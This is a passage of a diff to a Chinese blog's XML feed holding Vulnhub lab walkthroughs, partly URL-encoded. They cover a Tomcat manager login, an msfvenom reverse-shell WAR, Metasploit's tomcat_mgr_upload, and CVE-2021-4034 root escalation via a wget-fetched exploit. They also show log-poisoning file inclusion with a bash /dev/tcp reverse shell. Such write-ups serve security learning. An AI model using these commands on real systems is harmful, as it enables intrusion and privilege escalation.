png)%0A%0A**manager%3Amelehifokivai%0Aadmin%3Amelehifokivai**%0A%0A%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%94%A8%E6%88%B7%E5%90%8D%E9%83%BD%E8%83%BD%E7%99%BB%E9%99%86%20tomcat%20%E5%90%8E%E5%8F%B0%2C%E5%88%86%E5%88%AB%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E7%99%BB%E9%99%86%E3%80%82%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216143425.png)%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216143451.png)%0A%0A%E6%97%A2%E7%84%B6%E7%99%BB%E9%99%86%E4%BA%86%E5%90%8E%E5%8F%B0%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%9D%E8%AF%95%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA%20war%20%E5%8C%85%E7%84%B6%E5%90%8E%E5%8F%8D%E5%BC%B9shell.%0A%0A%E5%88%B6%E4%BD%9C%20war%20%E5%8C%85%E5%8F%AF%E4%BB%A5%E7%9C%8B%E6%88%91%E4%BB%A5%E5%89%8D%E7%9A%84%E5%8D%9A%E5%AE%A2%0A%5Bhttps%3A%2F%2Fwww.ohhhhhh.top%2F2021%2F12%2F29%2Fweb%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94My-Tomcat-HOST-1%2F%5D(https%3A%2F%2Fwww.ohhhhhh.top%2F2021%2F12%2F29%2Fweb%25E6%25B8%2597%25E9%2580%258F%25E2%2580%2594%25E2%2580%2594My-Tomcat-HOST-1%2F)%0A%0A**msfvenom%20-p%20java%2Fjsp_shell_reverse_tcp%20LHOST%3D172.27.243.168%20LPORT%3D4444%20-f%20war%20%3E%20shell.war**%0A%0A!%5Bshell.war%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216144155.png)%0A%0Akali%20%E5%BC%80%E5%90%AF%20nc%20%E7%9B%91%E5%90%AC%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0(%E5%B0%86%20shell.war%20%E6%8B%B7%E8%B4%9D%E5%88%B0%20win11%E4%B8%AD)%0A**nc%20-lvnp%204444**%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216144635.png)%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216144738.png)%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216145056.png)%0A%E5%8E%BB%E5%A5%B9%E5%A8%98%E7%9A%84%20404%EF%BC%8C%20%E7%9C%8B%E6%9D%A5%E8%BF%99%E4%B8%AA%E6%96%B9%E6%B3%95%E4%B8%8D%E5%BE%97%E8%A1%8C%E3%80%82md%0A%0A%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%20msfconsole%20%E4%B8%AD%E6%9C%89%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%20getshell%20%E7%9A%84%E6%A8%A1%E5%9D%97%E9%85%8D%E5%90%88%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E5%8D%B3%E5%8F%AF%E3%80%82%0A**use%20exploit%2Fmulti%2Fhttp%2Ftomcat_mgr_upload**%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216152731.png)%0A%E8%AE%BE%E7%BD%AE%E7%BA%A2%E6%A1%86%E7%9A%84%E5%86%85%E5%AE%B9%E5%8D%B3%E5%8F%AF%EF%BC%8C%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E5%9C%A8%E4%B8%8A%E9%9D%A2%E5%B7%B2%E7%BB%8F%E6%8B%BF%E5%88%B0%E3%80%82%0A%E7%84%B6%E5%90%8E**%20run%20**%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216152900.png)%0Arun%20%E4%B9%8B%E5%90%8E%EF%BC%8C%E8%BE%93%E5%85%A5%20shell%20%E8%BF%9B%E5%85%A5%20shell%20%E5%8F%AF%E7%96%91%E7%9C%8B%E5%88%B0%E4%B8%BA%20tomcat%20%E7%94%A8%E6%88%B7%E3%80%82%0A%0A**python3%20-c%20%22import%20pty%3Bpty.spawn('%2Fbin%2Fbash')%22**%0A%E8%BE%93%E5%85%A5%E6%AD%A4%E5%91%BD%E4%BB%A4%E5%BE%97%E5%88%B0%E6%A0%87%E5%87%86%E7%9A%84%E7%BB%88%E7%AB%AF%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216153414.png)%0A%0A%0A%23%23%23%20flag%201%0A%0A%E5%9C%A8%E7%9B%AE%E5%BD%95%20**%2Fhome%2Frandy**%20%E4%B8%AD%E6%9C%89%E7%AC%AC%E4%B8%80%E4%B8%AA%20flag%20%3A%20user.txt%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216153622.png)%0A%0A**%2Fhome%2Frandy%2Fnote.txt**%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216153808.png)%0A%60%60%60%0A%E5%98%BF%EF%BC%8C%E5%85%B0%E8%BF%AA%EF%BC%8C%E8%BF%99%E6%98%AF%E4%BD%A0%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%EF%BC%8C%E5%B8%8C%E6%9C%9B%E4%BD%A0%E4%BB%8A%E5%A4%A9%E8%BF%87%E5%BE%97%E6%84%89%E5%BF%AB%EF%BC%81%E6%88%91%E5%8F%AA%E6%98%AF%E6%83%B3%E8%AE%A9%E4%BD%A0%E7%9F%A5%E9%81%93%0A%E6%88%91%E6%9B%B4%E6%94%B9%E4%BA%86%E4%BD%A0%E5%AF%B9%E4%B8%BB%E7%9B%AE%E5%BD%95%E7%9A%84%E6%9D%83%E9%99%90%E3%80%82%E6%82%A8%E6%9A%82%E6%97%B6%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E6%88%96%E6%B7%BB%E5%8A%A0%E6%96%87%E4%BB%B6%E3%80%82%0A%E7%A8%8D%E5%90%8E%E6%88%91%E5%B0%86%E6%9B%B4%E6%94%B9%E8%BF%99%E4%BA%9B%E6%9D%83%E9%99%90%E3%80%82%0A%E4%B8%8B%E5%91%A8%E4%B8%80%E8%A7%81randy%EF%BC%81%0A%60%60%60%0A%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%20%2Fetc%2Fpasswd%20%E4%B8%AD%E5%8F%AF%E5%AD%98%E5%9C%A8%E7%9A%84%E7%94%A8%E6%88%B7%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216154406.png)%0A%0A%0A%23%23%20%E6%96%B9%E6%B3%95%E4%B8%80%0A%0A%E5%8F%91%E7%8E%B0%20jaye%20%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%92%8C%20manager%20%E7%9A%84%E5%AF%86%E7%A0%81%E4%B8%80%E6%A0%B7%E9%83%BD%E6%98%AF%20%EF%BC%9A%20melehifokivai%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216154901.png)%0A%0A**find%20%2F%20-perm%20-u%3Ds%20-type%20f%202%3E%2Fdev%2Fnull**%0A%E6%9F%A5%E6%89%BE%20%E5%85%B7%E6%9C%89%20SUID%20%E7%9A%84%E5%91%BD%E4%BB%A4%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E7%86%9F%E6%82%89%E7%9A%84%3A%20**polkit-agent-helper-1**%20cve%E7%BC%96%E5%8F%B7%3A%0A**CVE-2021-4034**%0Aexp%E8%BF%9E%E6%8E%A5%3A%0A%5Bhttps%3A%2F%2Fgithub.com%2Fberdav%2FCVE-2021-4034%5D(https%3A%2F%2Fgithub.com%2Fberdav%2FCVE-2021-4034)%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216155352.png)%0A%0A%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%9C%BA%E4%B8%8A%E6%B2%A1%E6%9C%89%20git%20%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%94%A8%20wget%20%E6%9B%BF%E4%BB%A3%EF%BC%8C%E6%9C%80%E5%90%8E%E5%8F%91%E7%8E%B0%E8%BF%98%E6%B2%A1%E6%9C%89%20make%20%E5%91%BD%E4%BB%A4%EF%BC%8C%E9%82%A3%E4%B9%88%E7%BC%96%E8%AF%91%E4%B8%8D%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%9C%A8kali%E4%B8%8A%E5%B0%86%E5%B7%B2%E7%BB%8F%E7%BC%96%E8%AF%91%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%88%B0%E9%9D%B6%E6%9C%BA%E4%B8%AD%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%90%E8%A1%8C%2C%E4%BB%A5%E5%90%8E%E9%81%87%E5%88%B0%E7%B1%BB%E4%BC%BC%E7%9A%84%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%B7%B2%E7%BB%8F%E7%BC%96%E8%AF%91%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%E3%80%82%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216160050.png)%0A%0A%E5%B0%86%E7%BC%96%E8%AF%91%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E9%9D%B6%E6%9C%BA%E4%B8%AD%3A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216162230.png)%0A%0A**wget%20http%3A%2F%2F172.27.243.168%3A8000%2FCVE-2021-4034.zip**%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216162319.png)%0A%E7%84%B6%E5%90%8E%E8%A7%A3%E5%8E%8B%0A**unzip%20CVE-2021-4034.zip**%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216162422.png)%0A%0A%E7%84%B6%E5%90%8E%E8%BF%9B%E5%85%A5%20**CVE-2021-4034**%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E8%BF%90%E8%A1%8C%20**.%2Fcve-2021-4034**%2C%E4%B8%8D%E5%87%BA%E6%84%8F%E5%A4%96%E7%9A%84%E8%AF%9D%E5%B0%B1%E4%BC%9A%E6%8B%BF%E5%88%B0%20root%20%E6%9D%83%E9%99%90%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216162724.png)%0A%0A%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E6%8B%BF%E5%88%B0%E4%BA%86root%20%E6%9D%83%E9%99%90%EF%BC%8C%E8%87%B3%E6%AD%A4%E5%8F%88%E5%8F%88%E5%8F%88%E9%80%9A%E8%BF%87%20CVE-2021-4034%20%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F%EF%BC%8C%E4%B8%8D%E4%BA%8F%E6%98%AF%E5%AD%98%E5%9C%A8%E4%BA%86%E5%8D%81%E5%A4%9A%E5%B9%B4%E7%9A%84%E6%BC%8F%E6%B4%9E!!!%0A%0A%23%23%23%20flag%202%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216162826.png)%0A%0A%0A%0A%23%23%20%E6%96%B9%E6%B3%95%E4%BA%8C%0A%20jaye%3Amelehifokivai%20ssh%20%E7%99%BB%E9%99%86%E5%90%8E%EF%BC%8C%E5%9C%A8%E5%85%B6%E5%AE%B6%E7%9B%AE%E5%BD%95%E4%B8%8B%20File%20%E4%B8%AD%E6%9C%89%20look%20%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%3A%0A%20**.%2Flook%20''%20'%2Froot%2Froot.txt'**%0A%20!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216164049.png)%0A%20%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E7%AC%AC%E4%BA%8C%E4%B8%AA%20flag%20%2C%20%E5%A6%82%E6%9E%9C%E5%9C%A8%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9B%B4%E6%8E%A5%E6%8F%90%E4%BA%A4%20flag%20%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%86%E3%80%82%0A%20%0A%20%23%23%20%E6%96%B9%E6%B3%95%E4%B8%89%0A%20%E5%8F%82%E8%80%83%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%3A%0A%20%5Bhttps%3A%2F%2Fwww.cnblogs.com%2Fsainet%2Fp%2F15668420.html%23%E4%B8%89%E6%8F%90%E6%9D%83%5D(https%3A%2F%2Fwww.cnblogs.com%2Fsainet%2Fp%2F15668420.html%23%25E4%25B8%2589%25E6%258F%2590%25E6%259D%2583)%0A%20%E6%88%91%E8%BF%99%E9%87%8C%E6%B5%8B%E8%AF%95%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF%E6%88%91%E7%9A%84%E5%8E%9F%E5%9B%A0%E3%80%82%0A%20%0A%0A%23%23%20%E6%80%BB%E7%BB%93%0A%0A1.%20CVE-2021-4034%0A2.%20look%20%E8%B6%8A%E6%9D%83%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%0A3.%20msfconsole%20use%20exploit%2Fmulti%2Fhttp%2Ftomcat_mgr_upload%20getshell%0A</center>
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
       </categories>
   </entry>
   <entry>
@@ -3232,7 +3304,7 @@
 
 <p>翻译过来大致如此，看来这个靶机和日志，ssh, phpmyadmin有关。</p>
 <p><a href="http://192.168.91.188/blog-post/">http://192.168.91.188/blog-post/</a></p>
-<p><a href="http://192.168.91.188/blog-post/uploads/">http://192.168.91.188/blog-post/uploads/</a><br><br>这两个连接访问是的的。<br><img src="/2022/02/15/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94CORROSION-1/fcd713864db98e90fe40b3d11c7d6efe.png" alt="fcd713864db98e90fe40b3d11c7d6efe.png" title="fcd713864db98e90fe40b3d11c7d6efe.png"><br><br>这个页面没什么有用的。</p>
+<p><a href="http://192.168.91.188/blog-post/uploads/">http://192.168.91.188/blog-post/uploads/</a><br><br>这两个连接访问是一样的。<br><img src="/2022/02/15/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94CORROSION-1/fcd713864db98e90fe40b3d11c7d6efe.png" alt="fcd713864db98e90fe40b3d11c7d6efe.png" title="fcd713864db98e90fe40b3d11c7d6efe.png"><br><br>这个页面没什么有用的。</p>
 <p><a href="http://192.168.91.188/blog-post/archives/randylogs.php">http://192.168.91.188/blog-post/archives/randylogs.php</a><br><br>这个页面根据根据名称可以判断出 可以文件包含 日志，但是我们看不到源代码不知道包含参数。</p>
 <p><img src="/2022/02/15/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94CORROSION-1/80549a076234f4f7dc1eefa1ee2e863d.png" alt="80549a076234f4f7dc1eefa1ee2e863d.png" title="80549a076234f4f7dc1eefa1ee2e863d.png"></p>
 <h3 id="FFUF"><a href="#FFUF" class="headerlink" title="FFUF"></a>FFUF</h3><p>但是可以猜测一下，不过可以使用 ffuf 工具来进行模糊测试（FUZZ）</p>
@@ -3262,7 +3334,7 @@
 <p>view-source:<a href="http://192.168.91.188/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;cmd=ls%20-alh">http://192.168.91.188/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;cmd=ls%20-alh</a><br><br>然后查看源代码最下面:</p>
 <p><img src="/2022/02/15/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94CORROSION-1/ca25780ef032f6b5299cfcfff2aa1f3d.png" alt="ca25780ef032f6b5299cfcfff2aa1f3d.png" title="ca25780ef032f6b5299cfcfff2aa1f3d.png"></p>
 <p>可以看到 命令 &amp;cmd=ls -alh 执行成功，那么现在可以执行命令，我们尝试反弹shell</p>
-<p>首先在kali 上监听<br><br>nc -lvnp 4444<br><br>然后执行命令：</p>
+<p>首先在kali 上监听<br><br><strong>nc -lvnp 4444</strong><br><br>然后执行命令：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// 要先将下面代码URL编码，然后执行</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/172.18.171.250/4444 0&gt;&amp;1&quot; | bash</span><br><span class="line"></span><br><span class="line">http://192.168.91.188/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;cmd=echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.171.250%2F4444%200%3E%261%22%20%7C%20bash</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/02/15/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94CORROSION-1/d754812e41b51d1cd3a99fb09551fd6d.png" alt="d754812e41b51d1cd3a99fb09551fd6d.png" title="d754812e41b51d1cd3a99fb09551fd6d.png"></p>
